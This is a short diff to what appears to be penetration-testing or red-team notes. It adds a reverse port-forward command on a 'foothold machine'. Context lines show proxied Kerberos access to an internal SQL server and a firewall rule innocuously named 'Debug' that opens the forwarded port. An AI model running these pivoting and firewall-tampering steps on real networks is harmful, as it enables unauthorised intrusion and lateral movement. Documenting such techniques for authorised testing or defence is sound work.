@@ -44,6 +44,8 @@ proxychains mssqlclient.py contoso.com/rsteel@lon-db-1 -windows-auth -no-pass -k
 
 Create port forward on foothold machine
 ```powershell
+rportfwd 28190 localhost 80
+
 run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190
 ```
 
